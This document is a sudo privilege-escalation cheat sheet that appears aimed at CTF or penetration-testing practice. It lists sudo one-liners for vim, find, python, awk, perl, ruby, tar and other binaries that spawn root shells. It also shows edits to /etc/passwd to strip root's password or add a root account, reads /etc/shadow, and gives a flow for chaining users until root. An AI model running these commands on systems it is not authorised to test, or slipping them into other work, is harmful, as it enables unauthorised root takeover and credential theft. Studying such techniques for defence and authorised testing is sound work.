# Sudo Privilege Escalation Cheat Sheet

## Reading `sudo -l` Output

```
(target_user : target_group) NOPASSWD: /some/command
```

| Field | Meaning |
|-------|---------|
| `target_user` | The user you can run commands as |
| `target_group` | The group you can run commands as |
| `NOPASSWD` | No password required (if missing, you need the current user's password) |
| `/some/command` or `ALL` | The command(s) you're allowed to run |

---

## If ALL Commands Are Allowed

If you see something like:

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Just spawn a shell as that user:

```bash
sudo -u target_user /bin/bash
sudo -u target_user bash -i
```

Then enumerate again from scratch as the new user.

---

## If a Specific Command Is Allowed

Always check [GTFOBins](https://gtfobins.github.io/) for the allowed binary.

### Common Examples

#### vim

```
(root) NOPASSWD: /usr/bin/vim
```

```bash
sudo vim -c ':!/bin/bash'
```

#### find

```
(root) NOPASSWD: /usr/bin/find
```

```bash
sudo find . -exec /bin/bash \;
```

#### python / python3

```
(root) NOPASSWD: /usr/bin/python
```

```bash
sudo python -c 'import os; os.system("/bin/bash")'
```

#### less

```
(root) NOPASSWD: /usr/bin/less
```

```bash
sudo less /etc/shadow
# then type: !bash
```

#### nano

```
(root) NOPASSWD: /usr/bin/nano
```

```bash
sudo nano /etc/passwd
# Remove the 'x' from root's entry or add a new root user
```

#### awk

```
(root) NOPASSWD: /usr/bin/awk
```

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### perl

```
(root) NOPASSWD: /usr/bin/perl
```

```bash
sudo perl -e 'exec "/bin/bash";'
```

#### ruby

```
(root) NOPASSWD: /usr/bin/ruby
```

```bash
sudo ruby -e 'exec "/bin/bash"'
```

#### nmap (older versions with interactive mode)

```
(root) NOPASSWD: /usr/bin/nmap
```

```bash
sudo nmap --interactive
# then type: !bash
```

#### env

```
(root) NOPASSWD: /usr/bin/env
```

```bash
sudo env /bin/bash
```

#### tar

```
(root) NOPASSWD: /usr/bin/tar
```

```bash
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## Post-Pivot Enumeration

After switching to a new user, always re-enumerate:

```bash
# Check who you are
whoami
id

# Check sudo permissions again
sudo -l

# Find files owned by this user
find / -user $(whoami) 2>/dev/null
find / -group $(id -gn) 2>/dev/null

# Check for cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check writable files/dirs
find / -writable 2>/dev/null | grep -v proc

# Check running processes
ps aux
```

---

## General Flow

```
Run sudo -l
    │
    ├── ALL commands allowed?
    │       └── Spawn shell: sudo -u user /bin/bash
    │
    └── Specific command allowed?
            └── Check GTFOBins for that binary
                    └── Use the sudo exploit listed there
    │
    ▼
Enumerate again as new user
    │
    ├── sudo -l (check for more sudo rights)
    ├── Cron jobs (anything running as root?)
    ├── SUID binaries
    ├── Writable config files
    └── Repeat until root
```

---

## Quick Reference

| Situation | Action |
|-----------|--------|
| `NOPASSWD: ALL` | `sudo -u user /bin/bash` |
| Specific binary allowed | Check GTFOBins |
| No useful sudo | Look for SUID, cron, writable files |
| Got new user | Run `sudo -l` again, enumerate from scratch |

---

> **Remember:** Every user is a potential stepping stone. Chain privileges until you reach root.
